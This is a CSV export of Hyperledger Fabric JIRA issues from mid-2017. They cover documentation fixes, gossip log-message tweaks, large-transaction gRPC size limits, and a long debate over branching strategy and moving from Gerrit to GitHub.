add chaincode tutorials to Getting Started ,FAB-5045,18735,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,28/Jun/17 10:19 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jun/17 10:04 PM,v1.0.0-rc1,,,,,fabric-docs,,,,,,0,,,,,,,also embed videos,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy61b:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jun/17 10:20 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11207;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Doc ""identity validation rules"" miss title",FAB-5046,18736,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jiangyaoguo,jiangyaoguo,jiangyaoguo,28/Jun/17 5:31 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,13/Jul/17 10:38 AM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"The doc ""msp-identity-validation-rules.rst"" misses title. The doc looks like
{code:java}
For more information on the validity of identities in the current MSP implementation we refer the reader to the identity validation rules <no title>.{code}",,ChristopherFerris,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy61j:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jun/17 10:56 PM;ChristopherFerris;it appears that this document is unreferenced in our documentation. It may be that it can be removed? [~ellaki]?;;;","28/Jun/17 11:30 PM;jiangyaoguo;https://gerrit.hyperledger.org/r/#/c/11209;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix chaincode msg,FAB-5047,18737,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,baohua,baohua,baohua,28/Jun/17 5:47 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,28/Jun/17 10:35 PM,,,,v1.0.0,,fabric-peer,,,,,,0,,,,,,,"In core/chaincode/chaincode_support.go.

The ready() method's failure should trigger ChaincodeMessage_READY msg in log instead of ChaincodeMessage_INIT",,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy61r:",,,,,,,,,,,,,,,,,,,,,,,baohua,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jun/17 5:54 PM;baohua;https://gerrit.hyperledger.org/r/#/c/11213/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Test large transactions end-to-end,FAB-5049,18741,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,username343,denyeart,denyeart,28/Jun/17 8:33 PM,30/Jul/19 11:42 AM,28/Oct/23 3:00 AM,30/Jul/19 11:42 AM,v1.0.0,v1.0.0-rc1,,v1.0.0,,fabric-quality,,,,,,0,,,,,,,"{color:#444444} Need system test to test extreme large transactions end-to-end.{color}

{color:#444444} For example a transaction with a huge key/value, and a transaction with a huge amount of keys/values? Need to identify and document all the config settings required to get large transactions through the system. I know in CouchDB there is max_document_size setting that will need to be updated (default is 16MB in CouchDB config ini files). There is no known max in goleveldb. I expect there will be config settings required at each of the transfer and storage points along the way (e.g. gRPC, kafka).{color}

{color:#444444}Note that grpc is currently limited to 100MB based on settings hardcoded here:{color}

{color:#444444}[https://github.com/hyperledger/fabric/blob/master/core/comm/config.go#L23-L24]{color}

{color:#444444}Need to investigate making this configurable.{color}",,denyeart,latitiah,mastersingh24,Ratnakar,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3857,FAB-3851,FABN-523,,,,FAB-3859,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2dr:",,,,,,,,,,,,,,,,,,,,,,,denyeart,latitiah,mastersingh24,Ratnakar,scottz,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/17 8:43 PM;yacovm;Note that the max gRPC message size in fabric is currently set to 100MB https://github.com/hyperledger/fabric/blob/master/core/comm/config.go#L23-L24;;;","28/Jun/17 10:27 PM;scottz;Note we should configure with:

   Orderer.AbsoluteMaxBytes < replica.fetch.max.bytes <= message.max.bytes

Defaults:
 * Orderer.AbsoluteMaxBytes 10, MB (but note: payload+hdrs+signs must be < message.max.bytes=1M default)
 * Orderer.PreferredMaxBytes 512, KB (limits the msgs in a batch, but not absolute; i.e. a single larger TX is allowed)
 * kafka.message.max.bytes 1,000,012 bytes
 * kafka.replica.fetch.max.bytes 1,048,576 bytes (not absolute)
 * kafka.replica.fetch.response.max.bytes 10,485,760 bytes

Someone would have to write/modify a chaincode to set ""thousands of keys/values within one transaction"", such as initializing thousands with init function. As for huge tansactions, we can increase TX sizes until reach a current limit, but continuing onward to ever larger sizes may take some iterations to identify and then modify size limits in different components of the system and comm protocols.;;;","30/Jun/17 12:46 AM;Ratnakar;[~latitiah] [~scottz] and I did some testing and here are our observations

[[chaincode|https://github.com/asararatnakar/nodeperf/blob/master/artifacts/src/github.com/uniqueKeyValue/uniqueKeyValue.go]] + *Solo Orderer + NodeSDK e2e tests* are used to drive the testing 

*+Iteration 1:+*
 With *10 KB* Payload Invoke/Query works fine
 With *100 KB* Payload Invoke/Query works fine
 With *500 KB* Payload Invoke/Query works fine
 With *1 MB* Payload Invoke/Query works fine
 With *2 MB* Payload Invoke/Query works fine
 With *2+ MB (~2.3 MB)* Payload Invoke works fine, however query fails with the below error
{code:java}
error: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: Received message larger than max (4449043 vs. 4194304)
 at /home/itpc/experims/fabric-sdk-node/node_modules/grpc/src/node/src/client.js:434:17
{code}
Repeat the same i.e, send *~2.3 MB* payload again, transaction (invoke) itself fails.
 Seems this is from the node-sdk client grpc module ?

*+Iteration 2+: I did RESET everything*

With *1 MB* Payload Invoke/Query works fine
 With *2 MB* Payload Invoke/Query works fine
 With *2+ MB (~2.5 MB) *Payload Invoke/Query works fine
 With *4 MB* Payload Invoke works fine, however query fails with the below error
{code:java}
error: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: Received message larger than max (8193044 vs. 4194304)
 at /home/itpc/experims/fabric-sdk-node/node_modules/grpc/src/node/src/client.js:434:17{code}
Repeat the same. i.e., send *4 MB *again, Transaction (invoke) itself fails.;;;","30/Jun/17 6:47 AM;latitiah;On Kafka (setting the KAFKA environment variables), 1MB, 1.5MB works fine. 2MB has problems on the query. When looking through the peer and orderer logs, there are no errors. The error comes from the sdk during a query. The error is the same as mentioned in the above comment:
{code}
error: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: Received message larger than max (4195347 vs. 4194304)
    at /home/itpc/experims/fabric-sdk-node/node_modules/grpc/src/node/src/client.js:434:17
error: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: Received message larger than max (4195347 vs. 4194304)
    at /home/itpc/experims/fabric-sdk-node/node_modules/grpc/src/node/src/client.js:434:17
Error: Received message larger than max (4195347 vs. 4194304)
Error: Received message larger than max (4195347 vs. 4194304)
{code}

What is strange is the message size reported is twice as much as the actual payload. ;;;","02/Aug/17 8:31 PM;denyeart;[~Ratnakar] [~latitiah] [~scottz]

Is there intent to get back to testing larger payloads?  Or is bug FAB-5117 blocking the larger tests?;;;","02/Aug/17 11:38 PM;latitiah;Yes, this is currently listed as a test that will be included in our regression suite of tests. Currently, the plan is to test payloads as high as 10MB. (FAB-3851) If you would like to see higher, let us know.;;;","03/Aug/17 12:45 AM;denyeart;[~latitiah]

Yes, need to stress test much larger than 10MB so that we become aware of all the bottlenecks and configuration points necessary for transactions with large data.  (although the huge payload stress doesn't doesn't have to be in a daily regression bucket, it could be in a test bucket that runs less often).

I didn't initially notice FAB-3851.  That could cover the large payload test.

{color:#444444}Do you want to create another test JIRA item for the huge number of keys/values test?  Then you could close out this JIRA in favor of the two more focused test JIRA items. I'll defer to your judgement...
{color};;;","30/Jul/19 11:42 AM;mastersingh24;Open 1 year or more with no activity ... time to cleanup;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement post v1.0.0 branching strategy,FAB-5050,18742,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,,ChristopherFerris,ChristopherFerris,28/Jun/17 10:46 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,16/Mar/18 12:30 AM,v1.0.0,,,Future,,fabric-build,,,,,,8,,,,,,,"We've had lots of discussion and debate on branching strategy in chat and on the mailing list. Time to make a decision and move forward is fast approaching.

The general consensus seems to be on a 2 branch strategy where we have the following branches:

master

release

We would use master for development, and release for the stable releases. The release branch would be made the DEFAULT branch on GH so that people cloning or forking the Fabric repositories would always be getting the latest stable release as the default, as opposed to people pulling from HEAD which would generally be somewhat unstable. This should yield a better end-user experience for people that want to build from source.

Of course, they can always change the branch and access master and the development HEAD if they so choose, but there's some effort involved. 

People working on Fabric repos would still be pulling the default master branch from Gerrit, and there would be no change to people pushing CRs by maintaining the master branch for development.

We would FF merge master into release when the time comes to cut a release.

Any fixes to release branch will need to be managed on both branches.

So, the point of this JIRA is to have a means of recording consensus. Please vote if you agree to adopt this strategy or leave a comment if you are opposed with the reasons for your opposition.",,C0rWin,ChristopherFerris,denyeart,dhuseby,JonathanLevi,jyellick,lehors,muralisr,nnao,ryjones,sheehan,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy627:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,C0rWin,ChristopherFerris,denyeart,dhuseby,JonathanLevi,jyellick,lehors,muralisr,nnao,ryjones,sheehan,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/17 1:32 AM;ChristopherFerris;Ok, this has reched the needed 5+ maintainers voting, so the policy will be implemented.;;;","29/Jun/17 2:18 AM;ChristopherFerris;I assigned this to Gari as I will be out. [~mastersingh24] and [~JonathanLevi] can work out when the right time to create the release branch(es) (from HEAD of master) is and then we'll need to have [~ryjones] or [~jwagantall] change the GH settings on the various repositories changed such that the 'release' branch is the *default* branch.;;;","29/Jun/17 2:44 AM;dhuseby;I'll jump in here just to have a paper trail.  This proposal doesn't address where new feature work and other works-in-progress will be done.  If there is only two branches–master(dev) and release–and the intent is to always FF merge from master to release, then the new feature work can't be done directly on master or release will receive half-baked, untested, undocumented code when the FF merge is done.  If you want to go with just two main branches then this proposal should also contain a requirement that all new feature work be done in short-lived feature branches that get merged into master once they are feature complete, covered with tests, and documented–that merge should be gated on maintainer approval.

The alternative is to have three main branches–master(dev), beta, release–where all new feature work is done directly on master(dev) and when features are feature complete, covered in tests, and documented, it will be cherry picked from master to beta–again, gated on maintainer approval.  If this system is used, then FF merges from beta to master to release would be the way the merges happen.

It doesn't matter which way is chosen, but FF merges are the requirement, then there has to be a branch that is always ""release candidate ready"" and only contains feature complete, tested, and documented code.

As it stands, I'm -1 on this proposal. ;;;","29/Jun/17 2:51 AM;dhuseby;Having two main branches master (dev) and release is the basis of [Gitflow|http://nvie.com/posts/a-successful-git-branching-model/] but this current proposal doesn't include the supporting branches needed to aid parallel development and controlled releases.;;;","12/Jul/17 7:51 AM;dhuseby;Where are we at on this?;;;","15/Jul/17 12:11 AM;ChristopherFerris;""release"" branch created for fabric, fabric-ca, fabric-sdk-node and fabric-samples. fabric-sdk-java needs to be finalized by Rick;;;","15/Jul/17 12:48 AM;jyellick;Concretely, we have cut v1.0.0.  Likely the next release will be v1.0.1, but many people will be working on features intended for v1.1.0.

For code which someone wishes to include in v1.0.1, is a CR submitted against master? against release? against both?

For code which someone wishes to include in v1.1.0 but not in v1.0.1, is the CR submitted against master? Does the CR need to somehow disable the code path by default in case of a v1.0.1 FF merge?;;;","15/Jul/17 12:49 AM;muralisr;[~ChristopherFerris] [~JonathanLevi] [~ryjones] [~mastersingh24] 

This is what I currently do for fabric dev (likely others use variations of these steps)
{code:java}
git checkout master
git pull origin
git checkout <your branch>
...make changes and commit ...
git push origin HEAD:refs/for/master {code}
Would be helpful to have cheatsheets/processes for some typical workflows
 * new features into master
 * bug fixes into release and master;;;","15/Jul/17 12:51 AM;denyeart;{color:#444444}Will there be a new release branch per release? e.g. once 1.1 is released will it still be possible to provide fixes on top of 1.0?{color};;;","18/Jul/17 10:52 PM;jimthematrix;for hotfixes on existing branches that can't wait until the next point release, we'll need to create a dedicated branch just for the hotfixes and tightly control what goes into it. The control is needed to minimize human errors because every fix that goes into these branches must also be (likely manually) put into the master (dev) branch. these hotfix branches should be kept to a minimum and only be created under the most extraordinary circumstances (serious security holes, crashes, data loss etc.)

the fabric-sdk-node has had one of these already ('v1.0.0-alpha.x') and luckily only one so far.;;;","18/Jul/17 11:15 PM;ChristopherFerris;Ok, let's take a breath.

I see no reason to move off of the cadence of releases we were on (roughly 2 weeks). Hence, I see no reason to be going around hot patching individual branches. 

For NEW FEATURES, all development should be done behind a feature flag, in parallel with existing code until such time as it is ready to be ""released"" fully supported with docs tests samples etc etc etc.

For refactors, we just need to be careful that we aren't making API/ABI changes, otherwise that needs more scrutiny and buy-in;;;","06/Sep/17 2:59 AM;dhuseby;What is wrong with feature branches?  Having feature flags is error prone and creates security issues.  The only way to prevent the security issues related to works in progress being checked into the main branch is if the work in progress code is conditionally compiled out.  If any WIP code gets compiled into the release, even if ""behind a feature flag"" it can be used in an exploit.  A lot–maybe most–exploits today use the combination of several smaller vulnerabilities to bootstrap into a full break-in.  Having half-finished code compiled into the released binary is dangerous because things like heap sprays and ROP attacks can leverage the half finished code to get even more control.

The only way to ensure that WIP code doesn't increase the attack surface of the software is to never include WIP code in the compiled binaries. One easy way to do that is to use feature branches for WIP code.  The other is to use conditional compilation.

If the argument is that feature branching is messy on Gerrit, we should switch to Github.  Countless other open source projects successfully use the Gitflow branching model that I proposed.  It's not a radical proposal.;;;","07/Sep/17 3:15 AM;JonathanLevi;p.s. I have temporarily de-assigned myself from this JIRA item, following our recent discussions that one would pick and self-assign a JIRA item when one (he/she) is ready to work on it.

Let's first try to reach a consensus here. I may re-assign myself once/if we have converged/concluded on the way to go about it.;;;","07/Sep/17 3:21 AM;JonathanLevi;Now, WRT that last note/paragraph of [~dhuseby] above... Especially now with their recently added Developer Certificate of Origin (DCO) capability, where do we stand in terms/the context of the discussion around the re-evaluation of returning to Github, for Hyperledger Fabric?

[~ChristopherFerris], [~mastersingh24], [~lehors], [~binhn], [~greg.haskins], ...;;;","07/Sep/17 5:21 AM;dhuseby;I see no reason to stay with Gerrit if it is the reason we can't use a better branching model.  Other HL projects are on Github and are meeting requirements.;;;","07/Sep/17 8:42 PM;lehors;[~JonathanLevi] Now that Chris is back we'll see if the discussion resumes but as far as I can tell the discussion isn't really going anywhere. I think the reason is that there aren't many technical limitations or capabilities that give one system over the other a real edge.

The main issue (I think) - DCO - has been addressed and there are ways to work around the others. So the discussion becomes mostly a question of personal preference and trade-offs one is willing to make.

It's clear that people have strong opinions about this topic but although it's not my preference, I think it's fair to say that although some people prefer Gerrit over GitHub they/we seem to be the minority. The majority of projects use GitHub and have no intention of switching to Gerrit, and among the projects that do use Gerrit there are people who wish the project would move to GitHub. That makes Gerrit the odd ball.

 ;;;","07/Sep/17 8:58 PM;JonathanLevi;Thank you [~dhuseby] and [~lehors]. Yes, I am getting a very similar vibe from the gist of the exchanges around this too.

Other than the work/overhead/leg-work required for migrating back back to GitHub... e.g., updating the documentation, how to contribute, and some of the CI jobs - one can argue that the lower barrier to entry, the popularity of GitHub and the consistency of the development lifecycle amongst the rest of the current Hyperledger projects, and making it possible to potentially embrace, in full or in part, [~dhuseby] 's branching scheme proposal(s) - may worth the migration.

In an attempt to be more proactive about it, let's try to phrase this differently:
*Is there anyone around who still feels strongly against us moving Hyperledger Fabric's main/core development workflow from Gerrit back to GitHub? If so, what are the reasons against doing so - and sticking with Gerrit?*
I'm mostly/mainly trying to gauge how off we are, from being able to converge here. Thank you.;;;","07/Sep/17 9:52 PM;lehors;[~JonathanLevi] Indeed, this may be a more practical way of moving forward. I would simply ask: how can GitHub be used to do the equivalent of what's being done today with Gerrit.

The email exchange provided some answers to that. Some things (DCO, 2+2) seem pretty simple, others (workflow) may require bigger changes in how things are done.

We could build a list of those things which would provide us with a practical list of things to consider as the cost of switching and, if we switch, as a handbook/guide on how things change.

Maybe this is actually what [~ChristopherFerris] had in mind for the task force but I think the way it was set up was maybe too broad. The above approach would avoid getting into a discussion on which system is better and I would think the GitHub fans would be eager to show/explain to the Gerrit supporters how GitHub can be used to achieve the same.;;;","07/Sep/17 10:10 PM;ChristopherFerris;Catching up and dealing with hurricane prep. [~dhuseby] - you are making a rather bold claim that ""feature-flags"" are error prone and create security issues. Care to back that up with evidence? Any code can be sloppily implemented and result in security issues. 

As for compiling out incomplete features for a release, that is one of the proposals on the table from Gari, especially for new modules.

I do NOT think it advisable to make radical changes to our process at this stage. There is a separate thread that I had started to look at (not to make changes) GitHub support and what best practices were for its use, ensuring DCO, issue tracking, enforcing multiple or NACR reviews, etc. 

Feature branches are JUST as complex and given the state of entanglement of the code base, I just don't see it as a workable approach to development as there is too much potential for collision of changes.

 

 ;;;","12/Sep/17 3:48 AM;dhuseby;Hi Chris,

I hope all is well down there post-storm.  Feature flags are error prone and cause security issues.  Any time you add one more thing to the checklist of things a developer has to remember–and that thing cannot be automated--you're increasing the chances of human error.  Having unfinished code in a binary does cause security issues, especially when the code processes untrusted data from the Internet.  If unfinished code never makes it into a released binary then it can never be exploited.  If unifinished code is shipped in a binary, even behind a feature flag, it can potentially be used by an attacker.  It increases the surface area for an attack.  My experience with browser security taught me that unfinished code is exploitable even when disabled by default.  Heap sprays that caused pointer jumps into PoC code that wasn't doing full security enforcement allowed for privilege escalation attacks.  I've seen it happen in the wild.  In the end the only way to avoid this kind of thing is to never ship unfinished code in a release binary.  Since feature flags can't be enforced with CI checks, the only way to prevent this entirely is to use feature branching and carefully manage what code gets merged into the release branch from which release binaries are built.

The gitflow branching model isn't my invention.  It is an accepted best practice that is used by many open source projects, including some of the most security sensitive projects such as bitcoin-core and tor.  Frankly I don't understand your resistance.  The only objection before was that Gerrit doesn't do feature branching well.  Now that we can seriously consider moving to Github, that's no longer an issue.  So is it Gerrit, or something else?  Sawtooth, Indy, Burrow, Composer, and Iroha all use Github and feature branching without any problems.  Iroha is a particularly spectacular example of good code management using branches.  They namespace feature branches under ""features"" and bug fixes under ""fixes"" making the building of a solid release branch trivial.  I did notice that Fabric, Cello, and Blockchain Explorer–the three projects using Gerrit–do not use feature branching so I suspect the problem lies with Gerrit.  I think we should seriously consider moving to Github and changing to a more security conscious branching strategy.  Github is the de facto standard for open source project collaboration and most developers know how to use Github even if they don't know command line git very well.  It would seem like a good move to minimize the barrier to entry for new contributors and to reduce the chances of human error causing security issues in the future.;;;","12/Sep/17 5:44 AM;ChristopherFerris;Still rather hand-wavy. As noted, we are intending to leverage compile flags so that we can exclude experimental code from the build. Of course, that isn't always possible. However, it does address your concern. However, my concern extends beyond just whether I like some workflow. 

For starters, migrating the project from Gerrit to GitHub is not an undertaking to be taken lightly. It is more than just the DCO though originally that was one of the overriding requirements. We also have a 2+2 review policy which AFAIK can only be manually implemented. It isn't clear that we can even implement NACR. AFAIK 2+2 cannot be automated without some extension. Also, migrating all of the CI, and integrating into the status updates for a PR is also no small feat. Setting up CI for feature branches is also no simple task. It means that we have to manage multiple branches of testing as well. Hence, while we possibly could move to GH that isn't necessarily in the cards and we as a project haven't agreed. 

I did set up the GH task force to explore best practices so that we could compare and make an informed decision collectively, and then plan the transition. You make it seem as if there isn't a transition cost that would take cycles away from development. It is no small feat. 

Then, there is the matter of the fact that our code base does not lend itself easily to feature branch development. There is far too much entangled shared code. I would be concerned that merging feature branches into the master/development would be complicated endeavors.;;;","13/Sep/17 8:51 AM;dhuseby;I'm sorry if I seemed like I didn't appreciate the transition cost.  I recognize that it would be a big deal to move from Gerrit to Github.  Also, using conditional compilation to prevent unfinished code from being shipped does satisfy my concerns about that.

As for 2+2, I don't think you need any extensions.  Feature branches will live in the github repo and the discussion threads for the PR on GH will include the review comments and the +1's from the maintainers.  Once it has the requisite approvals, then a maintainer can click the button to merge the branch into the ""next release"" branch–sometimes called the ""beta"" branch in my earlier slides and in the online literature.

I really only care about keeping unfinished code out of release binaries.  If your team has a solid way of doing that, then I'm OK with whatever you came up with.;;;","21/Nov/17 4:14 AM;dhuseby;It looks like we'll  have budget money in 2018 for hiring a consultant to help with the JIRA and our process in general. Hopefully we can revisit this then.;;;","21/Nov/17 5:04 AM;ChristopherFerris;I thought we were actively looking? ;;;","21/Nov/17 5:57 AM;dhuseby;AFAIK, I need to wait until I have the budget to spend.  I could be wrong.  Let me check with Todd.;;;","16/Mar/18 12:30 AM;ChristopherFerris;This is complete as of 1.1 release. We now have a branch specific to a minor release (for cutting patch releases) and master for development.;;;",,,,,,,,,,,,,
Fix gibberish log message,FAB-5051,18744,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,28/Jun/17 11:05 PM,21/Jul/18 3:53 AM,28/Oct/23 3:00 AM,02/Jul/17 1:49 AM,v1.0.0-rc1,,,v1.0.0,,fabric-gossip,,,,,,0,,,,,,,"When a peer is in a partition or is dead for a long enough time, gossip prints:
{code}
Haven't heard from"", id, ""for"", elapsedNonAliveTime
{code}

The problem is that the *id* is a string of a hash and its printed in gibberish.
It's not something humans can read, and we need to cast the string back to *[]byte* so it would be human readable.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy62f:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Lower gossip verification failure message to DEBUG,FAB-5052,18745,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,28/Jun/17 11:18 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,02/Jul/17 1:49 AM,v1.0.0-rc1,,,v1.0.0,,fabric-gossip,,,,,,0,,,,,,,"In gossip when a peer obtains an AliveMessage from a peer it hasn't received its certificate yet - it complains in the log in WARNING that it has received a message from some peer it can't verify its identity.

This is actually a common scenario where a peer is restarted and its in-meory certificate store is now empty, but the other peers contact the peer and send it alive messages which he can't verify until it syncs its certificates with them.

This startles users and I think we should reduce the logging severity from WARN to DEBUG.",,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy62n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Log transaction id ,FAB-5053,18746,,Story,Closed,FAB,Fabric,software,denyeart,,,High,Done,jyellick,rickr,rickr,28/Jun/17 11:28 PM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,11/Aug/17 9:06 PM,v1.0.0,,,v1.1.0,,fabric-orderer,,,,,,0,common-components,serviceability,,,,,SDK clients always log transaction id before sending requests to peers and orderers. This makes it ideal to search and grep through logs to follow the request flow.  When the orderer receives a request it would be ideal to have it as early on in the flow of work to log the transaction id.,,jyellick,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy62v:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jyellick,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"12/Jul/17 11:36 AM;rickr;Set back to high .. makes debugging difficult

 ;;;","12/Jul/17 11:36 AM;rickr;Set back to high .. makes debugging difficult

 ;;;","19/Jul/17 5:26 AM;jyellick;https://gerrit.hyperledger.org/r/#/c/11735/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
override e2e_cli tests in CI with byfn (fabric samples),FAB-5054,18747,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,28/Jun/17 11:43 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,04/Jul/18 12:55 PM,v1.0.0,v1.0.0-rc1,,v1.0.0,,fabric-build,fabric-ci,,,,,0,build-system,,,,,,"existing e2e script is performing e2e_cli tests but with the recent changes e2e script (Created a new script (bfyn) in fabric-samples repository).

Question is, which e2e script CI has to run for every commit in gerrit. or this should run both (e2e_cli and byfn (fabric-sampels)?",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy3g7:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/17 11:44 PM;rameshthoomu;[~ChristopherFerris] could you please provide your inputs please?;;;","04/Jul/18 12:55 PM;rameshthoomu;In the current process, CI runs byfn, eyfn as part of smoke tests and e2e_cli tests long with byfn, eyfn runs for every merge.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
error copy path of html files in docs/README.md,FAB-5055,18748,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jiangyaoguo,jiangyaoguo,jiangyaoguo,28/Jun/17 11:48 PM,21/Jul/18 3:56 AM,28/Oct/23 3:00 AM,29/Jun/17 5:09 PM,,,,,,,,,,,,0,,,,,,,"After ""make html"", all the html files will be generated in in docs/build/html.So if we want to have a web server, we should copy all files in docs/build/html, not source/build/html.",,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy633:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,jiangyaoguo,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/17 5:09 PM;jiangyaoguo;Duplicate with https://jira.hyperledger.org/browse/FAB-4959. Close this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
